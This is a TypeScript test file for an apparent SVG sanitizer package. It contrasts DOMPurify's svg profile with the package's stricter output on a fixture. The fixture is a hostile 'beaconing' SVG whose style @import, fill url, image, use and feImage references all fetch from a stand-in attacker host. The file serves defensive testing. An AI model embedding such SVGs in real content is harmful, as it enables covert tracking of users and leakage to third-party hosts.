/**
 * Why this package exists, as a test. DOMPurify's svg profile is excellent at
 * what it sets out to do — script, handlers, javascript: — and by design it
 * does not police *where an SVG fetches from*. This documents that gap
 * against the real DOMPurify, so the README's opening claim is checked on
 * every run and will fail loudly if DOMPurify ever changes.
 */

import DOMPurify from "dompurify";
import { describe, expect, it } from "vitest";
import { sanitizeSvg } from "../src";
import { serialize } from "./helpers";

export const BEACONING_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64">
  <style>
    @import url("https://attacker.invalid/steal.css");
    .logo { fill: url(https://attacker.invalid/paint.svg#g); }
  </style>
  <image href="https://attacker.invalid/track.png?u=1" width="64" height="64"/>
  <use href="https://attacker.invalid/sprite.svg#icon"/>
  <filter id="f"><feImage href="https://attacker.invalid/texture.png"/></filter>
  <rect class="logo" width="64" height="64" filter="url(#f)"/>
</svg>`;

describe("DOMPurify's svg profile on its own", () => {
  const purified = DOMPurify.sanitize(BEACONING_SVG, {
    USE_PROFILES: { svg: true, svgFilters: true },
    ADD_TAGS: ["use"],
  });

  it("keeps every external reference (this is the gap, not a bug in DOMPurify)", () => {
    expect(purified).toContain('href="https://attacker.invalid/track.png?u=1"');
    expect(purified).toContain('href="https://attacker.invalid/sprite.svg#icon"');
    expect(purified).toContain('href="https://attacker.invalid/texture.png"');
    expect(purified).toContain('@import url("https://attacker.invalid/steal.css")');
    expect(purified).toContain("fill: url(https://attacker.invalid/paint.svg#g)");
  });
});

describe("svg-sanitize-strict on the same input", () => {
  const out = serialize(sanitizeSvg(BEACONING_SVG));

  it("leaves nothing that resolves off-document", () => {
    expect(out).not.toContain("attacker.invalid");
    expect(out).not.toMatch(/@import/i);
    expect(out).toContain('filter="url(#f)"'); // the same-document reference is exactly what survives
  });
});
